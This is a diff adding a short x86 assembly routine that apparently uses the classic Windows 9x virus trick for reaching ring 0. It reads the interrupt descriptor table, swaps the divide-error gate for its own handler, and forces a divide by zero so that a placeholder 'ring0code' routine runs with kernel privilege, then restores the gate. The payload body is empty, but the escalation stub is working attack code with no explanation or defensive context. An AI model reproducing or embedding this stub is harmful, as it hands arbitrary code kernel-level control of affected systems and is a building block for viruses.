@@ -1,0 +1,42 @@
+
+
+
+                        call    tsr
+                        ret
+
+tsr:
+                        push    ebx             ; get IDT
+                        push    ebx
+                        sidt    [esp+2]
+                        pop     ebx
+                        pop     ebx
+
+                        lea     esi, ring0init
+
+                        xchg    [ebx], si       ; int00 <--> ring0init
+                        rol     esi, 16
+                        xchg    [ebx+6], si
+
+                        xor     edx, edx        ; call INT00
+                        xor     ecx, ecx
+                        div     ecx
+
+                        ret
+
+ring0init:              xchg    [ebx+6], si     ; int00 <--> ring0init
+                        rol     esi, 16
+                        xchg    [ebx], si
+
+                        dec     ecx             ; to return to "div ecx"
+
+                        call    ring0code
+
+                        iret
+
+
+ring0code:              pusha
+
+
+
+                        popa
+                        ret
